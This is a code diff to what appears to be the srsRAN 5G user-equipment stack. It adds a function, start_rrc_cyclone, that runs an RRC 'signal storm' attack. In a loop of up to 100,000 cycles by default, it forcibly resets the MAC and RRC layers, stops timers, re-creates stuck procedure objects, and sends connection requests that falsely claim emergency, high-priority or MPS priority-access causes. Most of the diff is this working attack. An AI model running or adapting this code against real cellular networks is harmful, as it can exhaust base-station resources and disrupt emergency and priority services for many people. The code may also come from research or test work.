@@ -27,6 +27,9 @@
 #include "srsran/interfaces/ue_rlc_interfaces.h"
 #include "srsue/hdr/stack/rrc_nr/rrc_nr_procedures.h"
 #include "srsue/hdr/stack/upper/usim.h"
+#include <chrono>
+#include <random>
+#include <thread>
 
 using namespace asn1::rrc_nr;
 using namespace asn1;
@@ -244,7 +247,12 @@ void rrc_nr::in_sync() {}
 void rrc_nr::out_of_sync() {}
 
 // MAC interface
-void rrc_nr::run_tti(uint32_t tti) {}
+void rrc_nr::run_tti(uint32_t tti)
+{
+  // Process on-going procedures in callback_list
+  // This is CRITICAL for procedures like setup_request_proc to progress
+  callback_list.run();
+}
 
 // PDCP interface
 void rrc_nr::write_pdu(uint32_t lcid, srsran::unique_byte_buffer_t pdu)
@@ -2364,6 +2372,113 @@ void rrc_nr::set_phy_config_complete(bool status)
       break;
   }
   phy_cfg_state = PHY_CFG_STATE_NONE;
+}
+
+void rrc_nr::start_rrc_cyclone()
+{
+    logger.info("[RRC_ATTACK_NR] ========== Starting Signal Storm Attack ==========");
+
+    const int max_attacks = args.rrc_storming_max_attacks > 0 ? args.rrc_storming_max_attacks : 100000;
+    const int attack_interval_ms = args.rrc_storming_interval_ms > 0 ? args.rrc_storming_interval_ms : 1000;
+    const int reset_delay_ms = 20; 
+
+    logger.info("[RRC_ATTACK_NR] Max cycles: %d, Delay: %dms", max_attacks, attack_interval_ms);
+    srsran::console("[RRC_ATTACK_NR] Starting SIGNAL storm: %d cycles @ %dms intervals\n", max_attacks, attack_interval_ms);
+
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<uint8_t> cause_dist_selector(0, 2);
+
+    int cycle_count = 0;
+    int successful_requests_initiated = 0;
+
+    while (cycle_count < max_attacks && running)
+    {
+        try {
+            cycle_count++;
+            logger.info("[RRC_ATTACK_NR] ========== Cycle %d/%d ==========", cycle_count, max_attacks);
+
+            // Force Release/Reset & Stop Timers
+            logger.info("[RRC_ATTACK_NR] Forcing local stack reset...");
+            mac->reset();    
+            rrc_release(); 
+            state = RRC_NR_STATE_IDLE; 
+
+            if (t300.is_running()) t300.stop();
+            if (t301.is_running()) t301.stop();
+            if (t302.is_running()) t302.stop();
+            if (t304.is_running()) t304.stop();
+            if (t310.is_running()) t310.stop();
+            if (t311.is_running()) t311.stop();
+            logger.info("[RRC_ATTACK_NR] All RRC timers stopped.");
+            
+            // Force-Recreate the stuck Procedure Object
+            // self-note: this fixed the "setup_req_proc STILL busy" error
+            if (setup_req_proc.is_busy()) {
+                logger.info("[RRC_ATTACK_NR] setup_req_proc is busy. Forcefully recreating it...");
+                
+                // the destructor of the procedure
+                setup_req_proc.~proc_t<setup_request_proc>();
+                
+                // call the constructor again in the same memory location
+                new (&setup_req_proc) proc_t<setup_request_proc>(*this);
+                
+                logger.info("[RRC_ATTACK_NR] setup_req_proc has been called.");
+            }
+            
+            // force-recreate other procedures that might be stuck
+            if (cell_selector.is_busy()) {
+                 cell_selector.~proc_t<cell_selection_proc, rrc_cell_search_result_t>();
+                 new (&cell_selector) proc_t<cell_selection_proc, rrc_cell_search_result_t>(*this);
+            }
+            
+            // Wait for stabilization
+            logger.info("[RRC_ATTACK_NR] Waiting %dms for stack cleanup...", reset_delay_ms);
+            std::this_thread::sleep_for(std::chrono::milliseconds(reset_delay_ms));
+
+            // Step 4: Verify State & Trigger Connection Request
+            if (setup_req_proc.is_busy()) {
+                 logger.error("[RRC_ATTACK_NR] setup_req_proc is STILL busy after recreation! Skipping.");
+                 std::this_thread::sleep_for(std::chrono::milliseconds(attack_interval_ms));
+                 continue;
+            }
+            
+            logger.info("[RRC_ATTACK_NR] Procedure is idle. Proceeding with new request.");
+
+            // Trigger Connection Request
+            srsran::nr_establishment_cause_t cause;
+            const char* cause_str;
+            uint8_t sel = cause_dist_selector(gen);
+            
+            if (sel == 0) {
+                cause = srsran::nr_establishment_cause_t::emergency;
+                cause_str = "emergency";
+            } else if (sel == 1) {
+                cause = srsran::nr_establishment_cause_t::highPriorityAccess;
+                cause_str = "highPriorityAccess";
+            } else {
+                cause = srsran::nr_establishment_cause_t::mps_PriorityAccess;
+                cause_str = "mps_PriorityAccess";
+            }
+            
+            logger.info("[RRC_ATTACK_NR] Triggering RRC connection_request (cause: %s)", cause_str);
+
+            if (connection_request(cause, nullptr) != SRSRAN_SUCCESS) {
+                logger.error("[RRC_ATTACK_NR] Failed to initiate connection_request procedure.");
+            } else {
+                successful_requests_initiated++;
+            }
+
+            // Step 6: Wait for Next Cycle
+            std::this_thread::sleep_for(std::chrono::milliseconds(attack_interval_ms));
+
+        } catch (const std::exception& e) {
+            logger.error("[RRC_ATTACK_NR] Exception occurred during attack loop: %s", e.what());
+            break;
+        }
+    } 
+
+    logger.info("[RRC_ATTACK_NR] ========== Finished Storming ==========");
 }
 
 } // namespace srsue
